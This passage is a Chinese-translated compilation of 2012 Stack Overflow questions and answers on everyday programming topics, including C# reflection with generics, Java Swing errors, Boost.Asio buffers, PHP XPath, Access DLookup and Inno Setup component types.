                Toast.makeText(getApplicationContext(), "Finished", Toast.LENGTH_SHORT).show();
            }
        };

        /*
         * Click to start the counter
         */
        Button buttonStart = (Button) findViewById(R.id.button_start);
        buttonStart.setOnClickListener(new View.OnClickListener()
        {

            @Override
            public void onClick(View v)
            {
                _countDownTimerWithPause.create();
            }
        });

        /*
         * Click to pause the counter
         */
        Button buttonPause = (Button) findViewById(R.id.button_pause);
        buttonPause.setOnClickListener(new View.OnClickListener()
        {

            @Override
            public void onClick(View v)
            {
                _countDownTimerWithPause.pause();
            }
        });

        /*
         * Click to resume the counter
         */
        Button buttonResume = (Button) findViewById(R.id.button_resume);
        buttonResume.setOnClickListener(new View.OnClickListener()
        {

            @Override
            public void onClick(View v)
            {
                _countDownTimerWithPause.resume();
            }
        });
    }

} 
```

很容易看出我是如何扩展的`CountDownTimerWithPause`以及应该调用哪些方法来启动、暂停和恢复计数器。

希望我能解释一下这个计数器的用法。

# c# - 无法通过反射将类型传递给泛型类

> ID：13806546
> 
> 赞同：4
> 
> 时间：2012-12-10T18:03:20.363
> 
> 标签：c#, generics, reflection

我有一堂课有以下...

```
public class Client<T> : IClient where T : IClientFactory, new()
{
    public Client(int UserID){}
} 
```

和另一个实现 IClientFactory 的类

```
public class Client : IClientFactory 
```

* * *

如果引用了 dll，那么我可以轻松地执行此操作来实例化它。

```
var data = new namespace.Client<namespace.OtherDLL.Client>(1); 
```

但显然，如果我尝试使用已加载的程序集执行此操作，则会失败，因为它不知道类型。我一直在阅读以使用反射来做到这一点。但我尝试实施这些想法并失败了。这是一篇关于它的文章。 [我可以将类型对象传递给泛型方法吗？](https://stackoverflow.com/questions/2100760/can-i-pass-a-type-object-to-a-generic-method)

```
Assembly myDllAssembly = Assembly.LoadFile(project.Path + project.Assembly);

Type type = myDllAssembly.GetType("Migration.Application.Client");

var data = new namespace.Client<type>(1); 
```

对此的任何帮助都会很棒，因为我试图只使用一个配置文件来让我在它们准备好提供给客户端时轻松地删除 DLL，并且只需修改配置文件以使事情正常进行。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-10T18:06:41.233

您需要使用反射调用该方法：

```
var type = typeof(Client<>).MakeGenericType(type);
var data = (IClient)Activator.CreateInstance(type, 1) 
```

# jframe - 令牌“getContentPane”的语法错误，此令牌后应有标识符

> ID：13806547
> 
> 赞同：3
> 
> 时间：2012-12-10T18:03:26.210
> 
> 标签：jframe

每个人。我的 GUI 由于某种原因似乎无法正常工作，无论我做什么来尝试解决这个问题，它都会变得更糟。“frame.getContentPane().add(emptyLabel, BorderLayout.CENTER);” 是代码中唯一向我发送错误的行，但我真的不知道如何修复它。我能得到一些帮助吗？这是整个 GUI 的代码

```
import java.awt.*;
import java.awt.event.*;
import javax.swing.*;
import javax.swing.border.*;
import java.io.*;

public class SpellCheckerGUI {
    JFrame frame = new JFrame("Spell Checker");
    frame.getContentPane().add(emptyLabel, BorderLayout.CENTER);
    frame.setSize(800, 800);
    frame.setLocationRelativeTo(null);
    frame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
    frame.setVisible(true);

    frame.add(new JLabel("Incorrect Words"));
    frame.add(new JTextField(100));
    }
} 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-12-10T18:05:09.117

您不能将任意语句放入类声明中。

您需要将其放入构造函数或`void main()`.

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-10T18:12:58.017

让我给你一个例子！

像这样使用

```
import java.awt.*;
import java.awt.event.*;
import javax.swing.*;
import javax.swing.border.*;
import java.io.*;

public class t1 {
    public t1(){
    JFrame frame = new JFrame("Spell Checker");
    frame.getContentPane().add(new Label(), BorderLayout.CENTER);
    frame.setSize(800, 800);
    frame.setLocationRelativeTo(null);
    frame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
    frame.setVisible(true);

    frame.add(new JLabel("Incorrect Words"));
    frame.add(new JTextField(100));
    }
} 
```

或者

```
import java.awt.*;
import java.awt.event.*;
import javax.swing.*;
import javax.swing.border.*;
import java.io.*;

public class t1 {
    public static void main(String args[]){
        JFrame frame = new JFrame("Spell Checker");
        frame.getContentPane().add(new Label(), BorderLayout.CENTER);
        frame.setSize(800, 800);
        frame.setLocationRelativeTo(null);
        frame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
        frame.setVisible(true);

        frame.add(new JLabel("Incorrect Words"));
        frame.add(new JTextField(100));
    }
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-11-29T17:25:40.883

对我有用的是：

```
emptyLabel el = new emptyLabel();
Container con = frame.getContentPane();
con.add(el, BorderLayout.CENTER); 
```

# c++ - 如何使用 boosts io_service.post() 执行函数并使用数组或指针作为参数？

> ID：13806549
> 
> 赞同：0
> 
> 时间：2012-12-10T18:03:35.683
> 
> 标签：c++, arrays, multithreading, boost, boost-asio

在尝试构建一个可以使用 boosts 传输数据块/数组的程序时，`async_write`我的线程可能遇到了问题：

这就是我想要执行的：

```
write(unsigned char *pMsg, unsigned short nMsgLen){
      io_service_.post(boost::bind(&m_client::write_buf, this, pMsg, nMsgLen));
}

write_buf(unsigned char *pMsg, unsigned short nMsgLen){

          boost::asio::async_write(target,
                            boost::asio::buffer(pMsg, nMsgLen),
                            boost::bind(&m_client::write_buf_compl,
                            this,
                            boost::asio::placeholders::error));
} 
```

它确实编译，但`pMsg`没有正确的内容，何时`write_buf`被调用，我认为这是因为它不是在同一个线程内调用的。

那么，我该如何调整这个结构来将我的数组作为参数传输呢？！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-10T18:14:05.600

看起来你很清楚你的问题出在哪里。它的快速解决方法是通过复制其内容来传递该缓冲区：

```
void write(unsigned char *pMsg, unsigned short nMsgLen) {
    // TODO: Take care of exception safety...
    char *pMsgCopy = (char *)malloc(nMsgLen);
    memcpy(pMsgCopy, pMsg, nMsgLen);
    io_service_.post(boost::bind(&m_client::write_buf, this,
                                 pMsgCopy, nMsgLen));
}

void write_buf(unsigned char *pMsg, unsigned short nMsgLen)
{
    // Achtung! Don't forget to free memory in complection callback.
    boost::asio::async_write(target,
                             boost::asio::buffer(pMsg, nMsgLen),
                             boost::bind(&m_client::write_buf_compl,
                                         this,
                                         boost::asio::placeholders::error));
}

void write_buf_compl(...)
{
    free(pMsg);
} 
```

如果您对效率很着迷，那么您可以通过让调用者`write()`首先提供动态分配的缓冲区来避免复制。但是，如果您实际上对性能很着迷，那么我建议您不要使用 Boost.ASIO。不过那是另一回事了。

# php - 从 php 调用 .so 共享库对象

> ID：13806550
> 
> 赞同：3
> 
> 时间：2012-12-10T18:03:39.770
> 
> 标签：php, shared-libraries

我有一个静态链接的 .so 我应该能够从中调用一个函数，它的第一个参数是要处理的数据的内存地址。我有一个用 Pascal 编写的示例调用程序，但我想知道的是，是否可以从 PHP 调用这个库函数？如果是这样，怎么做？注意：这个 .so 不是作为 PHP 扩展编写的

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2014-12-16T19:26:07.160

由于我想使用的库不是作为 PHP 扩展编写的，所以我不得不用 C 编写一个包装扩展，创建一个 PHP 方法，该方法接受 PHP 参数并在转换后使用参数调用库函数（例如使用指针为内存地址）。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-10T18:06:27.380

要在运行时加载 PHP 扩展，请使用[dl()](http://php.net/manual/en/function.dl.php)函数。

```
if (!extension_loaded('myextension')) {
   dl('myextension.so');
} 
```

然后，您应该能够使用该库中的对象/函数。

要记住的另一件事是需要启用 php.ini 中的**enable_dl指令。**

# nhibernate - 由内而外创建数据库

> ID：13806559
> 
> 赞同：0
> 
> 时间：2012-12-10T18:04:12.790
> 
> 标签：nhibernate, fluent-nhibernate, s#arp-architecture

我通常没有问题通过 NHibernate '播种'我的数据库，如下所示：

```
...
string[] mappingAssemblies = new string[] { "Bla.Di.Domain" };
string configFile = "NHibernate.config";
NHibernate.Cfg.Configuration config = NHibernateSession.Init(
    new SimpleSessionStorage(),
    mappingAssemblies,
    new AutoPersistenceModelGenerator().Generate(),
    configFile);

TextWriter writeFile = new StreamWriter("d:/SeedSQL.sql");

var session = NHibernateSession.GetDefaultSessionFactory().OpenSession();
new SchemaExport(config).Execute(true, true, false, session.Connection, writeFile); 
```

出于某种原因，没有为上述 dll (Bla.Di.Domain) 创建数据库，其简单类如下：

```
namespace Bla.Di.Domain
{
    using SharpArch.Domain.DomainModel;

    public class Test : Entity
    {
        public virtual string X { get; set; }
    }
} 
```

有什么可能出错的地方吗？我没有例外。我在“播种”项目中引用了 dll。也许我的 dll 的文件位置存在问题（这是一个相当复杂的解决方案）。谢谢。

PS（根据评论中的要求）：

这是我的 AutoPersistenceModelGenerator - 请注意它位于另一个命名空间中：

```
public class AutoPersistenceModelGenerator : IAutoPersistenceModelGenerator
{
    public AutoPersistenceModel Generate()
    {
        //var mappings = AutoMap.AssemblyOf<Bla>(new AutomappingConfiguration());
        var mappings = AutoMap.AssemblyOf<Test>(new AutomappingConfiguration());
        mappings.IgnoreBase<Entity>();
        mappings.IgnoreBase(typeof(EntityWithTypedId<>));
        mappings.Conventions.Setup(GetConventions());
        mappings.UseOverridesFromAssemblyOf<AutoPersistenceModelGenerator>();

        return mappings;
    }

    private static Action<IConventionFinder> GetConventions()
    {
        return c =>
           {
               c.Add<PrimaryKeyConvention>();
               c.Add<CustomForeignKeyConvention>();
               c.Add<HasManyConvention>();
               c.Add<TableNameConvention>();
           };
    }
} 
```

我添加了对域模型（不同的名称空间）的引用并进行了更改：

```
var mappings = AutoMap.AssemblyOf<Bla>(new AutomappingConfiguration()); 
```

至：

```
var mappings = AutoMap.AssemblyOf<Test>(new AutomappingConfiguration()); 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-11T18:19:54.877

假设我们有两个命名空间：CompanyName.X 和 CompanyName.Y。

CompanyName.X 包含类 A，CompanyName.Y 包含 B，其中 A 和 B 继承自 Entity。那么这种适应有助于：

原来的：

```
public class AutoPersistenceModelGenerator : IAutoPersistenceModelGenerator
{
    public AutoPersistenceModel Generate()
    {
        var mappings = AutoMap.AssemblyOf<A>(new AutomappingConfiguration());
        mappings.IgnoreBase<Entity>();
        mappings.IgnoreBase(typeof(EntityWithTypedId<>));
        mappings.Conventions.Setup(GetConventions());
        mappings.UseOverridesFromAssemblyOf<AutoPersistenceModelGenerator>();

        return mappings;
    }
    ... 
```

改编代码：

```
public class AutoPersistenceModelGenerator : IAutoPersistenceModelGenerator
{
    public AutoPersistenceModel Generate()
    {
        var mappings = AutoMap.AssemblyOf<A>(new AutomappingConfiguration());
        mappings.AddEntityAssembly(typeof(CompanyName.Y.B).Assembly);
        mappings.IgnoreBase<Entity>();
        mappings.IgnoreBase(typeof(EntityWithTypedId<>));
        mappings.Conventions.Setup(GetConventions());
        mappings.UseOverridesFromAssemblyOf<AutoPersistenceModelGenerator>();

        return mappings;
    }
    ... 
```

# java - 从类名创建列表或按列表转换

> ID：13806562
> 
> 赞同：0
> 
> 时间：2012-12-10T18:04:24.107
> 
> 标签：java, list, generics

我有通用类，我想创建一个`List`or cast by `List`。我只有类类型。我想要得到的是：

```
public class CustomerDao extends BaseDao<Customer> implements ICustomerDao {

    private Class<Customer> entityClass;

    public CustomerDao(Class<Customer> entityClass) {
        super(entityClass);
        this.entityClass = entityClass;
    }

    public void getCustomers() {
        List<***> list = (List<***>)getSessionFactory().getCurrentSession().createCriteria(entityClass).list();
    }
} 
```

现在我如何使用该字段`entityClass`来创建`List<***> list`？可能吗？

我可以使用`List<Customer> list = getSessionFactory().getCurrentSession().createCriteria(entityClass).list();`，但我想学习不同的方式。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-10T18:27:23.260

似乎您正在尝试实现一个特定于类型的 DAO（对于您的客户实体），该 DAO 派生自抽象的通用 Base DAO。如果这确实是您想要完成的，那么根本不需要泛型：

```
public class CustomerDao extends BaseDao<Customer> implements ICustomerDao {

    public CustomerDao() {
        super(Customer.class);
    }

    public List<Customer> getCustomers() {
        final List<Customer> list = (List<Customer>) getSessionFactory().
            getCurrentSession()
           .createCriteria(Customer.class).list();
    }
} 
```

自从我使用 Hibernate API 以来已经有一段时间了，但我认为您`List<Customer>`也不需要类型转换。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-10T18:06:31.270

那将毫无意义。
泛型只存在于编译时。

相反，您应该使整个类通用。

# php - PHP XPath：将查询结果评估为整数

> ID：13806572
> 
> 赞同：1
> 
> 时间：2012-12-10T18:05:02.843
> 
> 标签：php, xml, xpath

写这个：

```
$likes = $xpath->query('//span[@class="LikesCount"]'); 
```

这是我得到的：

```
155 like 
```

**我想编写查询以便 number_before_like > 5**

```
$likes = $xpath->query('

((int)substring-before(//span[@class="LikesCount"], " ")) > 5

'); 
```

遵循标记：

```
<div class="pin">

[...]

<a href="/pin/56787645270909880/" class="PinImage ImgLink">
    <img src="http://media-cache-ec3.pinterest.com/upload/56787645270909880_d7AaHYHA_b.jpg" alt="Krizia" data-componenttype="MODAL_PIN" class="PinImageImg" style="height: 288px;">
</a>

<p class="stats colorless">
    <span class="LikesCount"> 
        2 likes 
    </span>
    <span class="RepinsCount">
        6 repins
    </span>
</p>

[...]

</div> 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-10T19:10:42.510

您可以单独使用 XPath 语法来做到这一点，方法是确保从图片中去除无关的空白。

```
$query = 'number(substring-before(normalize-space(
          //span[@class="LikesCount" 
          and substring-before(normalize-space(.), " ") > 5]), " "))';

$likes = $xpath->evaluate($query); 
```

或者，让 PHP 为您完成艰苦的工作。

```
$query = 'number(php:functionString("intval",
          //span[@class="LikesCount"
          and php:functionString("intval", .) > 5]))';

$xpath->registerNamespace('php', 'http://php.net/xpath');
$xpath->registerPHPFunctions("intval");
$likes = $xpath->evaluate($query); 
```

如果您要开始要求 PHP 做一些工作，使用简单的查询并根据需要过滤结果可能会更容易。

```
foreach ($xpath->query('//span[@class="LikesCount"]') as $span) {
    $int = (int) $span->nodeValue;
    if ($int > 5) {
        echo $int;
    }
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-10T18:53:20.970

我相信您的问题实际上是您选择的`<span>`. 尝试剥离它们。例如，您可以使用[`normalize-space()`](http://www.w3schools.com/xpath/xpath_functions.asp#string)：

```
substring-before(normalize-space(//span[@class="LikesCount"]), " ") 
```

在执行大于运算符之前，XPath 处理器将类似计数字符串[转换为双精度。](http://www.w3.org/TR/xpath/#numbers)[（您可以通过number()](http://www.w3.org/TR/xpath/#function-number)强制进行此转换，但在这种情况下是不必要的，并且可能会因为自动转换失败的相同原因而失败 - 前导空格。）

# vba - dlookup 缓慢的结果

> ID：13806574
> 
> 赞同：1
> 
> 时间：2012-12-10T18:05:08.033
> 
> 标签：vba, ms-access-2010

我在访问 2010 时遇到问题，我的 dlookup 运行速度非常慢，但如果我已经打开了保存的查询，它运行得很快。任何想法都必须知道为什么会这样以及如何解决这个问题

编辑

```
txtPurchase_Price = DLookup("Purchase_Price", "qryPurchaseInfo", "ID = " & check) 
```

那是dlookup

查询的sql是

```
SELECT Receiving.Serial,Purchase_Info.Purchase_Price, Purchase_Info.Check_Number,
  Purchase_Info.Purchase_Date, Purchase_Info.ID, Receiving.Source
FROM Purchase_Info INNER JOIN Receiving ON 
  Purchase_Info.ID = Receiving.Purchase_Price_ID; 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-10T21:21:38.010

我不确定您为什么使用*查询*作为`DLookup`. `Purchase_Info.ID`如果您的意图是将允许值的集合限制为也作为值存在的值，那么这是有道理的`Receiving.Purchase_Price_ID`。

但如果是这种情况，请尝试使用更简单的查询。

```
SELECT
    Purchase_Info.Purchase_Price,
    Purchase_Info.ID
FROM Purchase_Info INNER JOIN Receiving
ON Purchase_Info.ID = Receiving.Purchase_Price_ID; 
```

虽然，我怀疑查询是否会显着提高速度，但我不明白为什么只要你在`Purchase_Info.ID`和上都有索引，它为什么会变慢`Receiving.Purchase_Price_ID`。

OTOH，如果这不是您的意图，那么您应该能够`Purchase_Price`直接从您的`Purchase_Info`表中检索，而无需将其加入到`Receiving`表中。使用以下索引应该很快`Purchase_Info.ID`：

```
DLookup("Purchase_Price", "Purchase_Info", "ID = " & check) 
```

最后，我不知道是什么`check`。它可以是窗体上的控件的名称。但是，不管它是什么，我宁愿给它一个不同的名字，因为它`check`是一个保留字。我永远无法预测保留字作为对象名称何时会造成麻烦，因此宁愿完全避免使用它们。

# actionscript-3 - 带有动作脚本 3 的 Youtube API

> ID：13806577
> 
> 赞同：1
> 
> 时间：2012-12-10T18:05:22.017
> 
> 标签：actionscript-3, youtube-api

我有一个嵌入了 youtube 视频的 Flash 横幅。当用户按下按钮时，横幅会转到特定帧并播放视频。我需要它做的是在视频完成后，将其转发到另一帧。

我用来拉入 youtube 视频的 AS3 如下：

```
stop();

var player:Object;

Security.allowDomain("www.youtube.com");

var vidctn:Loader = new Loader();
vidctn.load(new URLRequest("http://www.youtube.com/apiplayer?version=3"));
vidctn.contentLoaderInfo.addEventListener(Event.INIT, onLoaderInit);

function onLoaderInit(e:Event):void{
addChild(vidctn);
player = vidctn.content;
player.addEventListener("onReady", onPlayerReady);
}

function onPlayerReady(e:Event):void{
player.destroy();
addChildAt(vidctn,0);
player.setSize(304,173);
player.x = 0;
player.y = 40;
player.mute();
player.loadVideoById("Dzz6lUsF19g",0,"large");
} 
```

我想我需要一个事件监听器，可能是 Event.COMPLETE，但我似乎想不出一个。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-10T18:17:45.783

这些是 youtube api 的状态（您只需要 YT_ENDED，但拥有所有状态很好）：

```
 public static var YT_UNSTARTED:int = -1;
        public static var YT_ENDED:int = 0;
        public static var YT_PLAYING:int = 1;
        public static var YT_PAUSED:int = 2;
        public static var YT_BUFFERING:int = 3;
        public static var YT_CUED:int = 5; 
```

添加监听器：

```
 vidctn.contentLoaderInfo.addEventListener("onStateChange", onPlayerStateChange); 
```

这是功能：

```
 protected function onPlayerStateChange(event:Event):void {
            trace("youtubePlayer: player state:", Object(event).data);
            if(Object(event).data==YT_ENDED) {
                   //here you can do your stuff
            }
       } 
```

# android - WebView.flingScroll() 有什么作用？

> ID：13806587
> 
> 赞同：4
> 
> 时间：2012-12-10T18:05:52.717
> 
> 标签：android, android-webview

这个链接是我能找到的关于该[`flingScroll(vx,vy)`](http://developer.android.com/reference/android/webkit/WebView.html#flingScroll%28int,%20int%29)方法的所有文档。它没有描述该方法的作用。

该方法有什么作用？`vx`和是什么`vy`？我用它们作为坐标，但它们是速度吗？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-12-10T18:08:52.653

它模仿用户扔用户界面。vx 和vy 是x 和y 方向的速度（即用户滚动的速度决定了视图滚动的速度和距离）。

# c# - 如何获取有关绑定集合更改的通知？

> ID：13806588
> 
> 赞同：1
> 
> 时间：2012-12-10T18:05:57.287
> 
> 标签：c#, wpf

我定义了一个集合类型的附加依赖属性：

```
var selSrcPropMetadata = new PropertyMetadata(SelectionSourceChanged);
SelectionSourceProperty = DependencyProperty.RegisterAttached("SelectionSource",
                                                        typeof(IEnumerable), 
                                                        typeof(SelectionHelper), 
                                                        selSrcPropMetadata); 
```

属性更改回调仅在应用绑定时起作用。但是*如何获得有关绑定集合更改的通知*？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-10T18:10:06.360

在 SelectionSourceChanged 中，检查新的源值是否实现了 INotifyCollectionChanged。如果是，则将其强制转换并订阅其 CollectionChanged 事件。

# inno-setup - inno-setup 脚本中的可选组件和类型

> ID：13806591
> 
> 赞同：5
> 
> 时间：2012-12-10T18:06:12.717
> 
> 标签：inno-setup

我创建了以下 InnoSetup 脚本，用于按照 StackOverflow 答案中的建议添加可选组件：[Inno Setup - Correct use of [Types], [Components] and [Tasks]](https://stackoverflow.com/questions/8890828/inno-setup-correct-use-of-types-components-and-tasks)。

问题是当我运行脚本并选择安装或 Sherlock 或 Toby 类型时，我看到 Watson 也已安装。

```
; Script generated by the Inno Setup Script Wizard.
; SEE THE DOCUMENTATION FOR DETAILS ON CREATING INNO SETUP SCRIPT FILES!

#define MyAppName "Watson"
#define MyAppVersion "1.0"
#define MyAppExeName "Watson.exe"

[Setup]
; NOTE: The value of AppId uniquely identifies this application.
; Do not use the same AppId value in installers for other applications.
; (To generate a new GUID, click Tools | Generate GUID inside the IDE.)
AppId={{15C6F30B-A29D-48AD-A97A-9FDB4DD80EAE}
AppName={#MyAppName}
AppVersion={#MyAppVersion}
;AppVerName={#MyAppName} {#MyAppVersion}
AppPublisher={#MyAppPublisher}
AppPublisherURL={#MyAppURL}
AppSupportURL={#MyAppURL}
AppUpdatesURL={#MyAppURL}
DefaultDirName={pf}\{#MyAppName}
DefaultGroupName={#MyAppName}
OutputDir=Z:\EGPL Librarian Releases\Setup Scripts\All Install
OutputBaseFilename=LibrarianSetup
Compression=lzma
SolidCompression=yes
WizardImageFile=compiler:WizModernImage-IS.bmp
WizardSmallImageFile=compiler:WizModernSmallImage-IS.bmp
VersionInfoVersion=1.0
VersionInfoCompany=Draper Laboratory
VersionInfoDescription=Watson Librarian Server
VersionInfoTextVersion=Watson 1.0
VersionInfoCopyright=2012
VersionInfoProductName=EGPL Librarian
VersionInfoProductVersion=1.0
VersionInfoProductTextVersion=Watson 1.0

[Languages]
Name: "english"; MessagesFile: "compiler:Default.isl"

[Tasks]
Name: "desktopicon"; Description: "{cm:CreateDesktopIcon}"; GroupDescription: "{cm:AdditionalIcons}"; Flags: unchecked; Components: Watson Full

[Files]
Source: "Z:\EGPL Librarian Releases\Sample Installation\Watson\Watson.exe"; DestDir: "{app}"; Flags: ignoreversion; Components: Watson Full
Source: "Z:\EGPL Librarian Releases\Sample Installation\Watson\Devart.Data.dll"; DestDir: "{app}"; Flags: ignoreversion; Components: Watson Full
Source: "Z:\EGPL Librarian Releases\Sample Installation\Watson\Devart.Data.Linq.dll"; DestDir: "{app}"; Flags: ignoreversion; Components: Watson Full
Source: "Z:\EGPL Librarian Releases\Sample Installation\Watson\Devart.Data.PostgreSql.dll"; DestDir: "{app}"; Flags: ignoreversion; Components: Watson Full
Source: "Z:\EGPL Librarian Releases\Sample Installation\Watson\Devart.Data.PostgreSql.Linq.dll"; DestDir: "{app}"; Flags: ignoreversion; Components: Watson Full
Source: "Z:\EGPL Librarian Releases\Sample Installation\Watson\Devart.Data.PostgreSql.xml"; DestDir: "{app}"; Flags: ignoreversion; Components: Watson Full
Source: "Z:\EGPL Librarian Releases\Sample Installation\Watson\Devart.Data.xml"; DestDir: "{app}"; Flags: ignoreversion; Components: Watson Full
Source: "Z:\EGPL Librarian Releases\Sample Installation\Watson\Ionic.Zip.dll"; DestDir: "{app}"; Flags: ignoreversion; Components: Watson Full
Source: "Z:\EGPL Librarian Releases\Sample Installation\Watson\Watson.application"; DestDir: "{app}"; Flags: ignoreversion; Components: Watson Full
Source: "Z:\EGPL Librarian Releases\Sample Installation\Watson\Watson.exe.config"; DestDir: "{app}"; Flags: ignoreversion; Components: Watson Full
Source: "Z:\EGPL Librarian Releases\Sample Installation\Watson\Watson.exe.manifest"; DestDir: "{app}"; Flags: ignoreversion; Components: Watson Full
Source: "Z:\EGPL Librarian Releases\Sample Installation\Watson\Watson.pdb"; DestDir: "{app}"; Flags: ignoreversion; Components: Watson Full
; Toby
Source: "Z:\EGPL Librarian Releases\Sample Installation\wwwroot\Toby\*"; DestDir: "c:\\wwwroot\Toby"; Flags: ignoreversion createallsubdirs recursesubdirs; Components: Toby Full
; Sherlock
Source: "Z:\EGPL Librarian Releases\Sample Installation\wwwroot\Sherlock\*"; DestDir: "c:\\wwwroot\Sherlock"; Flags: ignoreversion createallsubdirs recursesubdirs; Components: Sherlock Full
; NOTE: Don't use "Flags: ignoreversion" on any shared system files

[Icons]
Name: "{group}\{#MyAppName}"; Filename: "{app}\{#MyAppExeName}"; Components: Full Watson
Name: "{group}\{cm:UninstallProgram,{#MyAppName}}"; Filename: "{uninstallexe}"; Components: Full Watson
Name: "{commondesktop}\{#MyAppName}"; Filename: "{app}\{#MyAppExeName}"; Components: Full Watson; Tasks: desktopicon

[Run]
Filename: "{app}\{#MyAppExeName}"; Flags: nowait postinstall skipifsilent; Description: "{cm:LaunchProgram,{#StringChange(MyAppName, '&', '&&')}}"; Components: Watson Full

[Types]
Name: "Everything"; Description: "Install Watson, Sherlock, and Toby"
Name: "Watson"; Description: "Install Only Watson"
Name: "Toby"; Description: "Install Only Toby"
Name: "Sherlock"; Description: "Install Only Sherlock"

[Components]
Name: "Full"; Description: "Full Install"; Types: Watson Everything Toby Sherlock
Name: "Watson"; Description: "Watson Component"; Types: Watson
Name: "Toby"; Description: "Toby Component"; Types: Toby
Name: "Sherlock"; Description: "Sherlock Component"; Types: Sherlock

[Code]
function IsDotNetDetected(version: string; service: cardinal): boolean;
// Indicates whether the specified version and service pack of the .NET Framework is installed.
//
// version -- Specify one of these strings for the required .NET Framework version:
//    'v1.1.4322'     .NET Framework 1.1
//    'v2.0.50727'    .NET Framework 2.0
//    'v3.0'          .NET Framework 3.0
//    'v3.5'          .NET Framework 3.5
//    'v4\Client'     .NET Framework 4.0 Client Profile
//    'v4\Full'       .NET Framework 4.0 Full Installation
//    'v4.5'          .NET Framework 4.5
//
// service -- Specify any non-negative integer for the required service pack level:
//    0               No service packs required
//    1, 2, etc.      Service pack 1, 2, etc. required
var
    key: string;
    install, release, serviceCount: cardinal;
    check45, success: boolean;
begin
    // .NET 4.5 installs as update to .NET 4.0 Full
    if version = 'v4.5' then begin
        version := 'v4\Full';
        check45 := true;
    end else
        check45 := false;

    // installation key group for all .NET versions
    key := 'SOFTWARE\Microsoft\NET Framework Setup\NDP\' + version;

    // .NET 3.0 uses value InstallSuccess in subkey Setup
    if Pos('v3.0', version) = 1 then begin
        success := RegQueryDWordValue(HKLM, key + '\Setup', 'InstallSuccess', install);
    end else begin
        success := RegQueryDWordValue(HKLM, key, 'Install', install);
    end;

    // .NET 4.0/4.5 uses value Servicing instead of SP
    if Pos('v4', version) = 1 then begin
        success := success and RegQueryDWordValue(HKLM, key, 'Servicing', serviceCount);
    end else begin
        success := success and RegQueryDWordValue(HKLM, key, 'SP', serviceCount);
    end;

    // .NET 4.5 uses additional value Release
    if check45 then begin
        success := success and RegQueryDWordValue(HKLM, key, 'Release', release);
        success := success and (release >= 378389);
    end;

    result := success and (install = 1) and (serviceCount >= service);
end;

function InitializeSetup(): Boolean;
begin
    if not IsDotNetDetected('v4\Full', 0) then begin
        MsgBox('Watson requires Microsoft .NET Framework 4.0 Full Profile.'#13#13
            'Please run dotNetFx40_Full_x86_x64.exe from the install disk,' #13
            'or download from www.microsoft.com/net,'#13
            'and then re-run the WatsonSetup.exe program.', mbInformation, MB_OK);
        result := false;
    end else begin
//        MsgBox('Found Microsoft .NET Framework 4.0.', mbInformation, MB_OK);
        result := true;
    end;
end; 
```

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-12-11T04:29:14.750

仅将每个文件与一个组件链接，然后将每个组件与将包含该组件（及其所有文件）的不同安装类型链接。

例如，定义这四种安装类型：

```
[Types]
Name: "full"; Description: "Install Watson, Sherlock, and Toby"
Name: "onlywatson"; Description: "Install Only Watson"
Name: "onlytoby"; Description: "Install Only Toby"
Name: "onlysherlock"; Description: "Install Only Sherlock" 
```

您可以只定义三个组件：

```
[Components]
Name: "watson"; Description: "Watson Component"; Types: onlywatson full
Name: "toby"; Description: "Toby Component"; Types: onlytoby full
Name: "sherlock"; Description: "Sherlock Component"; Types: onlysherlock full 
```

可以看到，每种`component`都包含两种类型，一种是*唯一的X*安装类型，另一种是*完整*安装类型。

然后，为每个组件定义您的文件（除非您有充分的理由包含一个没有组件或包含不同组件的文件，但这对我来说没有多大意义）。

```
[Files]
;watson
Source: "files\Watson.exe"; DestDir: "{app}"; Flags: ignoreversion; Components: watson
Source: "files\Watson.dll"; DestDir: "{app}"; Flags: ignoreversion; Components: watson
Source: "files\other.dll"; DestDir: "{app}"; Flags: ignoreversion; Components: watson
; Toby
Source: "files\toby\*"; DestDir: "{app}\extras\Toby"; Flags: ignoreversion createallsubdirs recursesubdirs; Components: toby
; Sherlock
Source: "files\Sherlock\*"; DestDir: "{app}\extras\Sherlock"; Flags: ignoreversion createallsubdirs recursesubdirs; Components: sherlock 
```

相同的推理适用于其他部分，例如`[Icons]`或`[Tasks]`，`[Run]`其中每个条目通常仅属于一个组件。

我为你做了一个快速测试，把所有这些放在一起：

```
#define MyAppName "Watson"
#define MyAppVersion "1.0"
#define MyAppExeName "watson.txt"
#define MyAppPublisher "Me.com"
#define MyAppURL "Me.com"

[Setup]
AppId={{15C6F30B-A29D-48AD-A97A-9FDB4DD80EAE}
AppName={#MyAppName}
AppVersion={#MyAppVersion}
AppPublisher={#MyAppPublisher}
AppPublisherURL={#MyAppURL}
AppSupportURL={#MyAppURL}
AppUpdatesURL={#MyAppURL}
DefaultDirName={pf}\{#MyAppName}
DefaultGroupName={#MyAppName}
OutputDir=Installer
OutputBaseFilename=LibrarianSetup
Compression=lzma
SolidCompression=yes
WizardImageFile=compiler:WizModernImage-IS.bmp
WizardSmallImageFile=compiler:WizModernSmallImage-IS.bmp
VersionInfoVersion=1.0
VersionInfoCompany=Draper Laboratory
VersionInfoDescription=Watson Librarian Server
VersionInfoTextVersion=Watson 1.0
VersionInfoCopyright=2012
VersionInfoProductName=EGPL Librarian
VersionInfoProductVersion=1.0
VersionInfoProductTextVersion=Watson 1.0

[Languages]
Name: "english"; MessagesFile: "compiler:Default.isl"

[Types]
Name: "full"; Description: "Install Watson, Sherlock, and Toby"
Name: "onlywatson"; Description: "Install Only Watson"
